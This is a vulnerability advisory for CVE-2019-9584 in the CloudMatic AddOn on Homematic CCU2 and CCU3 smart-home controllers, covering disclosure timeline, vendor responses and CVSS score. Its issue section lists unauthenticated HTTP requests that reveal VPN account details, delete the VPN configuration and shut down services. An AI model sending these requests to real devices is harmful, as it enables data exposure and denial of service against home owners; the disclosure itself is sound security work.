---
layout: post
title:  "CVE-2019-9584 eQ-3 Homematic AddOn 'CloudMatic' on CCU2 and CCU3 allows uncontrolled admin access, resulting in the ability to obtain VPN profile details, shutting down the VPN service and to delete the VPN service configuration. This is related to improper access control for all /addons/mh/ pages"
date:   2019-07-25 22:05:00 MEST
author: 'psytester'
---

# Overview

- CVE: CVE-2019-9584
- Author: psytester
- Title: eQ-3 Homematic AddOn 'CloudMatic' on CCU2 and CCU3 allows uncontrolled admin access, resulting in the ability to obtain VPN profile details, shutting down the VPN service and to delete the VPN service configuration. This is related to improper access control for all /addons/mh/ pages
- Vulnerability Type: CWE-284: Improper Access Control
-	CVSSv3 Base Score: 9.8
-	CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- Publishing Date: 25.07.2019
- Updated: --
- Vendor: eQ-3 AG for CCU Firmware contains from vendor EASY SmartHome GmbH the 'CloudMatic' AddOn
- Product: Homematic CCU2 and CCU3 'CloudMatic' AddOn
- Vendor eQ-3 contacted: 13.02.2019
- Vendor eQ-3 response on 11.04.2019 with "not responsible for AddOns"
- Vendor EASY SmartHome contacted: 21.05.2019
- Vendor EASY SmartHome confirmation: 22.05.2019
- Vendor patch: n.a. in CCU2 and CCU3, but a first hotpatch as [Github commit #76274aa](https://github.com/EasySmartHome/CloudMatic-CCUAddon/commit/76274aa77bb494aac3b4bfbc6c6e89d382852a96)
- Vendor EASY SmartHome Reference: [Github issue #8](https://github.com/EasySmartHome/CloudMatic-CCUAddon/issues/8)
- Affected Firmware version of CCU2: 2.35.16, 2.41.5, 2.41.8, 2.41.9, 2.45.6, 2.45.7, 2.47.10, 2.47.12, 2.47.15 tested
- Affected Firmware version of CCU3: 3.41.11, 3.43.16, 3.45.5, 3.45.7, 3.47.10, 3.47.15 tested


# Background

From [EASY SmartHome GmbH](https://www.cloudmatic.de) translated:<br>
Do you want to access your Smarthome via App and Web, with certified security, but without complex self-configurations? With your personal VPN access via CloudMatic Connect, you can access your Smarthome worldwide without having to acquire technical know-how and invest a lot of time and effort in your own configuration.<br>
<br>
Your added value<br>
- Secure remote access to the Smarthome
- Easy to set up
- Voice control via Amazon Alexa
- Remote control of other home power supplies (e.g. routers, NAS)
- Maintenance access for remote access by e.g. installers
- Connection to ConradConnect
- Link with IFTTT
- Communication between several control centers
- Remote control via various apps (e.g. Mediola, PocketControl, TinyMatic)
<br>
Your safety<br>
An important component of Smarthome systems is access security. Especially for remote access, security plays an important role and port forwarding etc. should not be used.

From [eQ-3 vendor's website for CCU2](https://www.eq-3.com/products/homematic/control-units-and-gateways/homematic-central-control-unit-ccu2.html):<br>
HomeMatic Central Control Unit CCU2

Homematic Central Control Unit is the central element of your Homematic system, offering a whole range of control, monitoring and configuration options for all the Homematic devices in your installation<br>
[....]<br>

From [eQ-3 vendor's website for CCU3](https://www.homematic-ip.com/en/products/detail/smart-home-central-control-unit-ccu3.html):<br>
The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures.<br>
[....]<br>

Past [eQ-3 press release](https://www.eq-3.de/aktuelles/newsreader/eq-3-schliesst-sicherheitsluecken-in-der-ccu.html) about taking security updates seriously (in German only):<br>
[...]<br>
eQ-3 ist es wichtig, dass auch solche Lücken geschlossen werden, die für die meisten Installationen keine Rolle spielen.<br> 
[...]<br>
Obwohl nur Nutzer betroffen sind, die gegen Sicherheitshinweise von eQ-3 verstoßen oder seit mehreren Jahren keine Sicherheitsupdates installiert haben, gibt eQ-3 solchen Fällen hohe Priorität und behebt entsprechende Sicherheitslücken schnellstmöglich nach Bekanntwerden in neuen Software-Versionen und Hotfixes.<br>
[...]

# Issue Description

While analyzing the CCU web interface based on given page files in file system path /www, this is another Improper Access Control resulting into Uncontrolled Resource Consumption and File Modification / Deletion vulnerability located in build-in 'CloudMatic' AddOn. This vulnerability can be exploited by unauthenticated attackers with access to the web interface.<br>

The following HTTP requests in Web Browser illustrates the attack vectors:

1. Information Disclosure<br>
In case of ```http://1.2.3.4/addons/mh/dotest2.cgi``` shows up an user account not "none":
```
Inhalt mhcfg
    userkennung= ..... here not "none" .....
```
The username could be found in search machines, directly linked to a person, which is living at town .....

2. Denial of Service / File Deletion:<br>
VPN setup is deleted by ```http://1.2.3.4/addons/mh/cleanup.cgi```<br>
Afterwards ```http://1.2.3.4/addons/mh/dotest2.cgi``` shows unset username and VPN key files where deleted
```
Inhalt mhcfg
    userkennung=none
```

3. Denial of Service:<br>
Shutting down the VPN service ```by http://1.2.3.4/addons/mh/dienstaus.cgi```<br>
Shutting down the Reverse proxy by ```http://1.2.3.4/addons/mh/dienstausngx.cgi```<br>
Shutting down the CloudMatic monitoring by ```http://1.2.3.4/addons/mh/dienstauszbx.cgi```<br>

# CVE

[CVE-2019-9584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9584)

# CVSSv3 Base Score

CVSSv3 Base Score: 9.8

CVSSv3 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

# Credit

[psytester](https://psytester.github.io)

Not owning an original CCU2 or CCU3, but you want to analyze the CCU 'for free'?<br>
You can download<br>
[piVCCU](https://github.com/alexreinert/piVCCU) for running the original CCU3 Firmware in lxc container on RaspberryPi<br>
[RaspberryMatic](https://github.com/jens-maus/RaspberryMatic) for running the opensource OCCU based release on different boards<br>

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information.
In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 by psytester and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
